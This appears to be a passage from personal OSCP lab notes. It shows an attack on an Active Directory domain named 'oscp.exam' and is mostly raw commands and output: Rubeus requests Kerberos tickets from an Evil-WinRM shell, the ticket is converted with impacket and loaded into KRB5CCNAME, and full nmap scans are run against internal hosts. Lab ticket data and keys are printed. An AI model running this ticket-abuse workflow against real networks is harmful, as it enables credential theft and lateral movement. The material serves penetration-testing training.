      +REmGjdW7bTBY4oPL83dJ/3QfwZrSTh6uvJapyEHwUwd0BN0AYkJEEZAMlsOX1ERZ4Fh4Eh7Qlacrbh/
      jeyCzWXfXN8gcJUnoCWB7l2rfviekzdtMNX8qGUGzpR7XpIFWFqTbqtbjMkI5Yc1XQsjvk2kZDQhzNNN
      Iw2PmWX1XZ66pGxFTO44ItiEYLy8OYsbznDpFsMyWzbtKkhCaOY4WBpgLztbqGINpNuGIHldmMDYuUGJ
      0OsuPq/m/APRH2Eb5dCMnOhjykX78cHamPFEb6USkMV69GjhIOzmi0Pqn7ZGJN4KyMER/54Q2c9nocpW
      WY1aS7lRdbJTaWrQ1qs4VgUNFjzZuh/lcnwAaC33rAjS8kzbP5UCPEuWNcjJVY933WyMhpQvXJZVKi/8
      a1JB5WjD7nCUBwbaFLgccgGe9ysZdMvCE0LnpBw6GJxpZWdoflY9TY1KV6vqbasRX0OjhLX4l0rZNsD5
      S4RdYXLGWlrcMoWOIobvORVouOEUglcnXwvfkJwIRi1aneQnkrc68WeDjwLVCTS2HpebK+kbclJnPNoi
      jo619jkGxCKo1QOM5iaQGFg2Y2TKiyP7vt5gih0bjWtODkFpbtL8tKAF51UuWQCWRm1HDMej2yHv6I+w
      9almoho/imBOlhQdnqIM4DRVoWUwr9y336OBzjCBy6ADAgEAooHDBIHAfYG9MIG6oIG3MIG0MIGxoBsw
      GaADAgEXoRIEENTAIZ+AsYgimQ5CrqqFV32hCxsJT1NDUC5FWEFNohYwFKADAgEBoQ0wCxsJci5hbmRy
      ZXdzowcDBQBA4QAApREYDzIwMjUxMjE4MjE1NDAzWqYRGA8yMDI1MTIxOTA3NTQwM1qnERgPMjAyNTEy
      MjUyMTU0MDNaqAsbCU9TQ1AuRVhBTakeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFt

  ServiceName              :  krbtgt/oscp.exam
  ServiceRealm             :  OSCP.EXAM
  UserName                 :  r.andrews
  UserRealm                :  OSCP.EXAM
  StartTime                :  12/18/2025 1:54:03 PM
  EndTime                  :  12/18/2025 11:54:03 PM
  RenewTill                :  12/25/2025 1:54:03 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  1MAhn4CxiCKZDkKuqoVXfQ==
  ASREP (key)              :  5883FE1B8F0912B3AE14D4115E6B77B4

  *Evil-WinRM* PS C:\Users\r.andrews\Documents> .\Rubeus.exe asktgs /user:r.andrews /ticket:doIFWjCCBVagAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAgEFoQsbCU9TQ1AuRVhBTaIeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFto4IENTCCBDGgAwIBEqEDAgECooIEIwSCBB9g8IqEd333cD2PxVzKtY+RdDHWqjuTcws5rteCngv5ltPQ7KfxZGA4iK2zP1p4BAunoEF5EP8e2ErwmQEb5bTZhd6iX3vHN5KaYkmS6f30tjyjJEoFhORCtO9G7/n7zowqkNxcfJiBdK793GnCFuFqWj06I3gdyxLPvrmF15cPvTuYvYxQ9VjKG/s42QeqnfE+iE+rW3/TGo/HGDP3VIG/OS2Y2QJvxvjcnsM+op4ejcwr3vGxVOJftkz/RcLtwJoBcbTdpO6/gN9RqwRQrX99QBI1o681IXQ0WeH66HmGxCKumqgaA9Gv/WI+0ripazj/1SXzP0Vib8t6hN0d0D1Zvf57CqdS5FMr2lyiaN4wqq9cLUDZzFIHCp439fKKxRX46XfskQgi3Zq4LWp2+9D8u2ogdZLvDr4R8yPrqLv+vn+YXK86zoOifWyd46+a1Z3oOo8GowPfRx4URU+N+d9729HZD41+qe7UFKrhAPnAOL7g27vbBv6ZXdEdwKcMgEjGzbzsVOGGdlYxWBwYlm72Ns9Vdw0yTLmT4dFjyuYuNFLZvq0tfRd4h5SIDbu7RapD9xsL1+EhEd2M5iP16d8yUPQzhSjDNs/g3QL6Be+pfHovYmM04T+/w3qDH630GP94akEhxOyp2EsYA9KzxdGDJS2HT7jCDc/mf363/jTTZPrGeQbtm7G8F0yV2L14Xvupcx77lVi2lShUp8NOWUgsOq0u6yqV+REmGjdW7bTBY4oPL83dJ/3QfwZrSTh6uvJapyEHwUwd0BN0AYkJEEZAMlsOX1ERZ4Fh4Eh7Qlacrbh/jeyCzWXfXN8gcJUnoCWB7l2rfviekzdtMNX8qGUGzpR7XpIFWFqTbqtbjMkI5Yc1XQsjvk2kZDQhzNNNIw2PmWX1XZ66pGxFTO44ItiEYLy8OYsbznDpFsMyWzbtKkhCaOY4WBpgLztbqGINpNuGIHldmMDYuUGJ0OsuPq/m/APRH2Eb5dCMnOhjykX78cHamPFEb6USkMV69GjhIOzmi0Pqn7ZGJN4KyMER/54Q2c9nocpWWY1aS7lRdbJTaWrQ1qs4VgUNFjzZuh/lcnwAaC33rAjS8kzbP5UCPEuWNcjJVY933WyMhpQvXJZVKi/8a1JB5WjD7nCUBwbaFLgccgGe9ysZdMvCE0LnpBw6GJxpZWdoflY9TY1KV6vqbasRX0OjhLX4l0rZNsD5S4RdYXLGWlrcMoWOIobvORVouOEUglcnXwvfkJwIRi1aneQnkrc68WeDjwLVCTS2HpebK+kbclJnPNoijo619jkGxCKo1QOM5iaQGFg2Y2TKiyP7vt5gih0bjWtODkFpbtL8tKAF51UuWQCWRm1HDMej2yHv6I+w9almoho/imBOlhQdnqIM4DRVoWUwr9y336OBzjCBy6ADAgEAooHDBIHAfYG9MIG6oIG3MIG0MIGxoBswGaADAgEXoRIEENTAIZ+AsYgimQ5CrqqFV32hCxsJT1NDUC5FWEFNohYwFKADAgEBoQ0wCxsJci5hbmRyZXdzowcDBQBA4QAApREYDzIwMjUxMjE4MjE1NDAzWqYRGA8yMDI1MTIxOTA3NTQwM1qnERgPMjAyNTEyMjUyMTU0MDNaqAsbCU9TQ1AuRVhBTakeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFt /service:LDAP/DC20.oscp.exam

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'LDAP/DC20.oscp.exam'
[*] Using domain controller: DC20.oscp.exam (172.16.55.200)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFeDCCBXSgAwIBBaEDAgEWooIEgjCCBH5hggR6MIIEdqADAgEFoQsbCU9TQ1AuRVhBTaIhMB+gAwIB
      AqEYMBYbBExEQVAbDkRDMjAub3NjcC5leGFto4IEPTCCBDmgAwIBEqEDAgEFooIEKwSCBCczpHMawaFe
      SKGRvEbx1cO8nyPr7XFhUOIL+R8w0fXY3rE2YuJk4nr7tksfvB4zEDZUVVQHhv1d8PXbWbLYYBrgNjE4
      HbEiBmbYljX8G465c3PsCtsR5C2uiQ9e84VBU5rVeuaHngt7kG5roIchezVUfg0LenqgJxEwM0ObX7Dh
      yJ267k0LtekINTFGlgWJmhwLNJmY1s/TFfZY17GeLztsQqsIZl/sZWvJBwDAc67ouxl+GbfzIxDVmHRa
      hJII2GhsGB3IskPzKB/8edEmwRyPNvvVo4PvbTDZBx1UmMNZCHO573DtBbewEJuHi9ASrcFzA+PVEVn9
      /IspXpqTfkEoV2nfK34eqbu4UANi1Hory6zu1JuhGeP/Nzf1nUPWVhYWXOVbQAuG7PMfkTsQNT8Lvlaa
      7Y4v+iXs+U/hOSNVpRRt5WgU0eBISqgoKp7OZ55NOdURslP4ElaPo2QvkSV83kQ7rcDi0ZMk7hFKYL0j
      UAzlMdpJ9zoQtmjEoRw3qbIVAyd7O+2gS7wTYSmxrP5elQJvX9O6kUHBVLYZkJ5ClQAFK4CZx8+MJp6Z
      Y5EisUTIeBVxKhQ1oLcwVrEckM94pxPvGs5m91dUEPdcB/GWbZLHM6YR/EZ2OlhQvt6bE0IXYh4bh4tr
      a1pEblrcD9k1Yn6FZQJ+gfBek8Frdk0TdDjiKV1bwhKl0MWGYWJO1/22ObZ0G+SOAS9gnnAenyw33QfA
      lbGld7qXDUKun5tLXvPB+m3zNd/BBHzg4h+FFGvRl2xOmwQOKudK6QzxA7oJFWfAMS5VhLEg24CuhCwa
      S34RwoqB8eXH8BPZeD/NNtGE8gCeEJ9lSSRY9ejebEim6yf5ThjSImryWgMX+Po+SSULbfeSJ3sJteXo
      WLtlXA5D1Ki2/Hunzo59UuqbsQRw4NEDgT2jyyIPLt6V8FqtQ/kO/BdJJH0NgTuhhwsHNUXt5kSkaNym
      ynaB9K1RAc9RiWyGaCFTYnoIWQi6zALMqLc+/D1h8ciLAHBZu4mdk5lbc3ukTXn5oaXYsft7nVXKgkky
      ENHowLWfnHxr02oJPM2w/Uh5dDQyFMLQ1PcRMsaGvTZvjDx6KwlkYHniQoRhv9i3MVZ5VxBE24IwZudS
      nF2j9rnBFV7VFa/gos7eyNAdWWI474xxHMj+EeZpRsvuyupFJzMMHG+v2hajykpWLNeJZDVyDLTeuX27
      3E2WJXIhLi2xUhMvjg/qg2FxgoonqS5qJPmneawv9iE+AtPZZDXY4uBrh6r7TNE20+mMl7uwLIDtrtB3
      mVwdNBndATcwuVW4Bxi4A9534OCYLZKlU/PHQOT6OQiPVSwWy+6gOlIW4PxFSCwA9fJW/J6NwsfFRWis
      PNvInmSskk2CyqoqpaXoLPXSY5Qj2JN86lN/n9hBYVNnljE7o4HhMIHeoAMCAQCigdYEgdN9gdAwgc2g
      gcowgccwgcSgKzApoAMCARKhIgQgWuBjlmc0ud8N5fLdLBnOX/58havBoij2zcfZny+fxjmhCxsJT1ND
      UC5FWEFNohYwFKADAgEBoQ0wCxsJci5hbmRyZXdzowcDBQBApQAApREYDzIwMjUxMjE4MjIwNjIzWqYR
      GA8yMDI1MTIxOTA3NTQwM1qnERgPMjAyNTEyMjUyMTU0MDNaqAsbCU9TQ1AuRVhBTakhMB+gAwIBAqEY
      MBYbBExEQVAbDkRDMjAub3NjcC5leGFt

  ServiceName              :  LDAP/DC20.oscp.exam
  ServiceRealm             :  OSCP.EXAM
  UserName                 :  r.andrews
  UserRealm                :  OSCP.EXAM
  StartTime                :  12/18/2025 2:06:23 PM
  EndTime                  :  12/18/2025 11:54:03 PM
  RenewTill                :  12/25/2025 1:54:03 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  WuBjlmc0ud8N5fLdLBnOX/58havBoij2zcfZny+fxjk=

```

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# echo "doIFWjCCBVagAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAgEFoQsbCU9TQ1AuRVhBTaIeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFto4IENTCCBDGgAwIBEqEDAgECooIEIwSCBB9g8IqEd333cD2PxVzKtY+RdDHWqjuTcws5rteCngv5ltPQ7KfxZGA4iK2zP1p4BAunoEF5EP8e2ErwmQEb5bTZhd6iX3vHN5KaYkmS6f30tjyjJEoFhORCtO9G7/n7zowqkNxcfJiBdK793GnCFuFqWj06I3gdyxLPvrmF15cPvTuYvYxQ9VjKG/s42QeqnfE+iE+rW3/TGo/HGDP3VIG/OS2Y2QJvxvjcnsM+op4ejcwr3vGxVOJftkz/RcLtwJoBcbTdpO6/gN9RqwRQrX99QBI1o681IXQ0WeH66HmGxCKumqgaA9Gv/WI+0ripazj/1SXzP0Vib8t6hN0d0D1Zvf57CqdS5FMr2lyiaN4wqq9cLUDZzFIHCp439fKKxRX46XfskQgi3Zq4LWp2+9D8u2ogdZLvDr4R8yPrqLv+vn+YXK86zoOifWyd46+a1Z3oOo8GowPfRx4URU+N+d9729HZD41+qe7UFKrhAPnAOL7g27vbBv6ZXdEdwKcMgEjGzbzsVOGGdlYxWBwYlm72Ns9Vdw0yTLmT4dFjyuYuNFLZvq0tfRd4h5SIDbu7RapD9xsL1+EhEd2M5iP16d8yUPQzhSjDNs/g3QL6Be+pfHovYmM04T+/w3qDH630GP94akEhxOyp2EsYA9KzxdGDJS2HT7jCDc/mf363/jTTZPrGeQbtm7G8F0yV2L14Xvupcx77lVi2lShUp8NOWUgsOq0u6yqV+REmGjdW7bTBY4oPL83dJ/3QfwZrSTh6uvJapyEHwUwd0BN0AYkJEEZAMlsOX1ERZ4Fh4Eh7Qlacrbh/jeyCzWXfXN8gcJUnoCWB7l2rfviekzdtMNX8qGUGzpR7XpIFWFqTbqtbjMkI5Yc1XQsjvk2kZDQhzNNNIw2PmWX1XZ66pGxFTO44ItiEYLy8OYsbznDpFsMyWzbtKkhCaOY4WBpgLztbqGINpNuGIHldmMDYuUGJ0OsuPq/m/APRH2Eb5dCMnOhjykX78cHamPFEb6USkMV69GjhIOzmi0Pqn7ZGJN4KyMER/54Q2c9nocpWWY1aS7lRdbJTaWrQ1qs4VgUNFjzZuh/lcnwAaC33rAjS8kzbP5UCPEuWNcjJVY933WyMhpQvXJZVKi/8a1JB5WjD7nCUBwbaFLgccgGe9ysZdMvCE0LnpBw6GJxpZWdoflY9TY1KV6vqbasRX0OjhLX4l0rZNsD5S4RdYXLGWlrcMoWOIobvORVouOEUglcnXwvfkJwIRi1aneQnkrc68WeDjwLVCTS2HpebK+kbclJnPNoijo619jkGxCKo1QOM5iaQGFg2Y2TKiyP7vt5gih0bjWtODkFpbtL8tKAF51UuWQCWRm1HDMej2yHv6I+w9almoho/imBOlhQdnqIM4DRVoWUwr9y336OBzjCBy6ADAgEAooHDBIHAfYG9MIG6oIG3MIG0MIGxoBswGaADAgEXoRIEENTAIZ+AsYgimQ5CrqqFV32hCxsJT1NDUC5FWEFNohYwFKADAgEBoQ0wCxsJci5hbmRyZXdzowcDBQBA4QAApREYDzIwMjUxMjE4MjE1NDAzWqYRGA8yMDI1MTIxOTA3NTQwM1qnERgPMjAyNTEyMjUyMTU0MDNaqAsbCU9TQ1AuRVhBTakeMBygAwIBAqEVMBMbBmtyYnRndBsJb3NjcC5leGFt" | base64 -d > tgt.kirbi
```

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# impacket-ticketConverter tgt.kirbi tgt.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# export KRB5CCNAME=tgt.ccache     
                                                                                                                                  
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# klist
Ticket cache: FILE:tgt.ccache
Default principal: r.andrews@OSCP.EXAM

Valid starting       Expires              Service principal
12/18/2025 18:54:03  12/19/2025 04:54:03  krbtgt/oscp.exam@OSCP.EXAM
        renew until 12/25/2025 18:54:03
```



* Establecemos tunel

* nmap
1. 
```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nmap -A -vv -p- -T4 -Pn -oX WS27.scan 172.16.55.202 --webxml
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 17:47 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:47
Completed NSE at 17:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:47
Completed NSE at 17:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:47
Completed NSE at 17:47, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:47
Completed Parallel DNS resolution of 1 host. at 17:47, 0.02s elapsed
Initiating SYN Stealth Scan at 17:47
Scanning 172.16.55.202 [65535 ports]
Discovered open port 445/tcp on 172.16.55.202
Discovered open port 135/tcp on 172.16.55.202
Discovered open port 3389/tcp on 172.16.55.202
Discovered open port 139/tcp on 172.16.55.202
Discovered open port 8080/tcp on 172.16.55.202
SYN Stealth Scan Timing: About 2.25% done; ETC: 18:10 (0:22:29 remaining)
SYN Stealth Scan Timing: About 5.20% done; ETC: 18:07 (0:18:33 remaining)                                           
SYN Stealth Scan Timing: About 8.63% done; ETC: 18:05 (0:16:04 remaining)                                           
SYN Stealth Scan Timing: About 12.71% done; ETC: 18:03 (0:13:51 remaining)                                          
SYN Stealth Scan Timing: About 17.36% done; ETC: 18:02 (0:11:59 remaining)                                          
Discovered open port 5985/tcp on 172.16.55.202                                                                      
SYN Stealth Scan Timing: About 23.27% done; ETC: 18:00 (0:09:57 remaining)                                          
SYN Stealth Scan Timing: About 28.20% done; ETC: 18:00 (0:08:57 remaining)                                          
SYN Stealth Scan Timing: About 33.96% done; ETC: 17:59 (0:07:49 remaining)                                          
SYN Stealth Scan Timing: About 38.71% done; ETC: 17:59 (0:07:09 remaining)
SYN Stealth Scan Timing: About 44.99% done; ETC: 17:59 (0:06:30 remaining)
SYN Stealth Scan Timing: About 51.49% done; ETC: 17:59 (0:05:29 remaining)
SYN Stealth Scan Timing: About 57.20% done; ETC: 17:58 (0:04:44 remaining)
SYN Stealth Scan Timing: About 63.53% done; ETC: 17:59 (0:04:09 remaining)
SYN Stealth Scan Timing: About 69.27% done; ETC: 17:59 (0:03:25 remaining)
SYN Stealth Scan Timing: About 75.84% done; ETC: 17:58 (0:02:37 remaining)
SYN Stealth Scan Timing: About 81.12% done; ETC: 17:58 (0:02:02 remaining)
SYN Stealth Scan Timing: About 86.17% done; ETC: 17:58 (0:01:29 remaining)                                          
SYN Stealth Scan Timing: About 92.20% done; ETC: 17:58 (0:00:50 remaining)                                          
Completed SYN Stealth Scan at 17:58, 625.43s elapsed (65535 total ports)                                            
Initiating Service scan at 17:58                                                                                    
Scanning 6 services on 172.16.55.202                                                                                
Completed Service scan at 17:58, 16.09s elapsed (6 services on 1 host)                                              
Initiating OS detection (try #1) against 172.16.55.202                                                              
Retrying OS detection (try #2) against 172.16.55.202                                                                
NSE: Script scanning 172.16.55.202.                                                                                 
NSE: Starting runlevel 1 (of 3) scan.                                                                               
Initiating NSE at 17:58                                                                                             
NSE Timing: About 99.88% done; ETC: 17:59 (0:00:00 remaining)                                                       
Completed NSE at 17:59, 41.27s elapsed                                                                              
NSE: Starting runlevel 2 (of 3) scan.                                                                               
Initiating NSE at 17:59                                                                                             
Completed NSE at 17:59, 0.75s elapsed                                                                               
NSE: Starting runlevel 3 (of 3) scan.                                                                               
Initiating NSE at 17:59                                                                                             
Completed NSE at 17:59, 0.01s elapsed
Nmap scan report for 172.16.55.202
Host is up, received user-set (0.14s latency).
Scanned at 2025-12-18 17:47:54 -03 for 692s
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON         VERSION
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 64
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
| ssl-cert: Subject: commonName=SRV22.oscp.exam
| Issuer: commonName=SRV22.oscp.exam
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-17T18:21:45
| Not valid after:  2026-06-18T18:21:45
| MD5:   9cd9:cece:52b1:3d47:4639:b7aa:51dc:2f18
| SHA-1: 7481:333e:80a9:9f89:077c:5633:9b5d:7e0e:628e:fbe9
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQaY4hk7cEfZdN1tmLiC3eRzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9TUlYyMi5vc2NwLmV4YW0wHhcNMjUxMjE3MTgyMTQ1WhcNMjYw
| NjE4MTgyMTQ1WjAaMRgwFgYDVQQDEw9TUlYyMi5vc2NwLmV4YW0wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQD6Eh5W86f1n+tlmD+ZJkZJ5JKr8vNmMft/
| ZZmjFwFM9ofTYwUVWNBLUQM5Vdeqq2t29+9waqQDIGazktsXc52zwg8FXdNLjdnd
| MLDWziBi508/ajDU8jCcflju3azVujJsmxwNmrPgMVdtLMXl6vpSt0Vj98t9AUtp
| aALQSDVpIAnqZzfeR1xyUlvdQRQ4QEbrm+2LfVsx1FoDQsBBevw/DBYGZTZAAlvD
| hUq/ucLnKaAgEmZuy6Kfxq3m7+X/RQslf4i7WLarB1br/Bjg2+wj6GKAEQtx67Fm
| 9fJUbiPfYaskrgSGqhvfxd6PHE6pa8Y5WpRs5+lIZku4KWCueC8lAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAEsRgGmq2hN8YA7oLRNbgpbLiMFXPdhm4Uabh5SYtqruJX6euv/TzMGDO
| RKiTdLqpnRiZEbL629Xza0BJ/e+z8lnKGftNxjP+o00aMLZN4C0pGGooDigwTsY9
| paN5HEYVgf0f+vndZ4HHtVXQ4C2WMAxVROiL3V7GXqan5Hxb8Hq4Mn3WDtbsfoJf
| T0tXecEqyJbL/otqJyUkeyczvlUImfVr86UlJ45H9a51lX3VkH4ZqQm9T7kfcxD2
| ikMYGxNDMgrP2cSYKueucKb4m8/thpw89S0pS6Z6oHnTg8+O2d1JDrHgmakckcsm
| meaSIoiYLIBc+IbtwsqISGCxvLSQeg==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-12-18T20:59:25+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: SRV22
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: SRV22.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-18T20:58:44+00:00
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http          syn-ack ttl 64 Jetty 10.0.20
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.20)
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/18%OT=135%CT=%CU=%PV=Y%G=N%TM=69446B2E%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 29.690 days (since Wed Nov 19 01:25:27 2025)
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56729/tcp): CLEAN (Timeout)
|   Check 2 (port 6864/tcp): CLEAN (Timeout)
|   Check 3 (port 51101/udp): CLEAN (Timeout)
|   Check 4 (port 13214/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-12-18T20:58:47
|_  start_date: N/A

TRACEROUTE
HOP RTT       ADDRESS
1   143.74 ms 172.16.55.202

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 693.83 seconds
           Raw packets sent: 131483 (5.788MB) | Rcvd: 806 (34.544KB)
```

2. DC01

```bash
┌──(root💀kali)-[/home/…/OSCP/Exam-2/machines/ActiveDirectory]
└─# nmap -A -vv -p- -T4 -Pn -oX dc01.scan 172.16.55.200 --webxml                                                                                                                                  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 17:47 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:47
Completed NSE at 17:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:47
Completed NSE at 17:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:47
Completed NSE at 17:47, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:47
Completed Parallel DNS resolution of 1 host. at 17:47, 0.02s elapsed
Initiating SYN Stealth Scan at 17:47
Scanning 172.16.55.200 [65535 ports]
Discovered open port 53/tcp on 172.16.55.200
Discovered open port 445/tcp on 172.16.55.200
Discovered open port 135/tcp on 172.16.55.200
Discovered open port 139/tcp on 172.16.55.200                                                                       
Discovered open port 3269/tcp on 172.16.55.200                                                                      
SYN Stealth Scan Timing: About 4.11% done; ETC: 17:59 (0:12:03 remaining)                                           
Discovered open port 593/tcp on 172.16.55.200                                                                       
Discovered open port 593/tcp on 172.16.55.200                                                                       
Discovered open port 88/tcp on 172.16.55.200                                                                        
SYN Stealth Scan Timing: About 6.69% done; ETC: 18:02 (0:14:11 remaining)                                           
SYN Stealth Scan Timing: About 9.13% done; ETC: 18:03 (0:15:06 remaining)                                           
SYN Stealth Scan Timing: About 12.98% done; ETC: 18:03 (0:14:12 remaining)                                          
SYN Stealth Scan Timing: About 17.47% done; ETC: 18:01 (0:12:22 remaining)                                          
Discovered open port 5985/tcp on 172.16.55.200                                                                      
Discovered open port 49673/tcp on 172.16.55.200                                                                     
Discovered open port 49674/tcp on 172.16.55.200                                                                     
Discovered open port 49674/tcp on 172.16.55.200                                                                     
SYN Stealth Scan Timing: About 29.60% done; ETC: 18:03 (0:11:35 remaining)                                          
Discovered open port 49677/tcp on 172.16.55.200                                                                     
SYN Stealth Scan Timing: About 33.32% done; ETC: 18:03 (0:10:45 remaining)                                          
SYN Stealth Scan Timing: About 39.38% done; ETC: 18:03 (0:09:53 remaining)                                          
Discovered open port 49704/tcp on 172.16.55.200                                                                     
SYN Stealth Scan Timing: About 44.70% done; ETC: 18:03 (0:09:03 remaining)                                          
Discovered open port 636/tcp on 172.16.55.200                                                                       
SYN Stealth Scan Timing: About 51.72% done; ETC: 18:04 (0:08:14 remaining)                                          
Discovered open port 49667/tcp on 172.16.55.200                                                                     
SYN Stealth Scan Timing: About 57.14% done; ETC: 18:04 (0:07:22 remaining)                                          
Discovered open port 3268/tcp on 172.16.55.200                                                                      
SYN Stealth Scan Timing: About 62.95% done; ETC: 18:04 (0:06:29 remaining)                                          
SYN Stealth Scan Timing: About 67.90% done; ETC: 18:04 (0:05:31 remaining)                                          
Discovered open port 464/tcp on 172.16.55.200                                                                       
Discovered open port 49743/tcp on 172.16.55.200                                                                     
Discovered open port 9389/tcp on 172.16.55.200                                                                      
Discovered open port 9389/tcp on 172.16.55.200                                                                      
SYN Stealth Scan Timing: About 73.54% done; ETC: 18:03 (0:04:23 remaining)                                          
Discovered open port 389/tcp on 172.16.55.200                                                                       
Discovered open port 389/tcp on 172.16.55.200                                                                       
SYN Stealth Scan Timing: About 78.29% done; ETC: 18:03 (0:03:32 remaining)                                          
SYN Stealth Scan Timing: About 83.55% done; ETC: 18:03 (0:02:38 remaining)                                          
SYN Stealth Scan Timing: About 88.86% done; ETC: 18:02 (0:01:45 remaining)                                          
Completed SYN Stealth Scan at 18:01, 888.99s elapsed (65535 total ports)                                            
Initiating Service scan at 18:01                                                                                    
Scanning 19 services on 172.16.55.200                                                                               
Completed Service scan at 18:02, 56.46s elapsed (19 services on 1 host)                                             
Initiating OS detection (try #1) against 172.16.55.200                                                              
Retrying OS detection (try #2) against 172.16.55.200
NSE: Script scanning 172.16.55.200.
